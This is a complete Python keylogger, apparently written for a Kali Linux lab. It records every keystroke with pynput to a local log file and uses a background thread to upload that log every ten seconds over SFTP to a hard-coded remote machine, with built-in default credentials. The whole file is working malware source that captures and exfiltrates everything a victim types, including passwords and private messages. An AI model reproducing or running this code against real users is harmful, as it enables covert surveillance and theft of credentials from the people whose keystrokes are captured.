import logging
from pynput import keyboard
import paramiko
import time
import threading

log_file = "keystrokes.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error logging keystroke: {e}")

# Sends the log file to a Kali Linux machine using SFTP (via Paramiko)
def send_to_kali():
    kali_ip = "192.168.18.150"  # Update this with your Kali machine's IP
    username = "kali"           # Your Kali username
    password = "kali"           # Your Kali password

    try:
        print(f"Trying to connect to {kali_ip}...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(kali_ip, username=username, password=password)
        print("Connected to Kali.")

        print(f"Uploading {log_file} to /home/{username}/ on the Kali machine...")
        sftp = ssh.open_sftp()
        sftp.put(log_file, f"/home/{username}/{log_file}")
        sftp.close()
        print("Upload complete.")
    except Exception as e:
        print(f"Failed to send file: {e}")
    finally:
        if ssh:
            ssh.close()

def periodic_transfer(interval):
    while True:
        time.sleep(interval)
        send_to_kali()

# Start capturing keystrokes and send logs periodically
print("Keylogger is running. Press Ctrl+C to stop.")
listener = keyboard.Listener(on_press=on_press)

try:
    listener.start()  

    transfer_thread = threading.Thread(target=periodic_transfer, args=(10,), daemon=True)
    transfer_thread.start()

    while listener.is_alive():
        time.sleep(0.1)

except KeyboardInterrupt:
    print("\nKeylogger stopped.")
finally:
    listener.stop() 
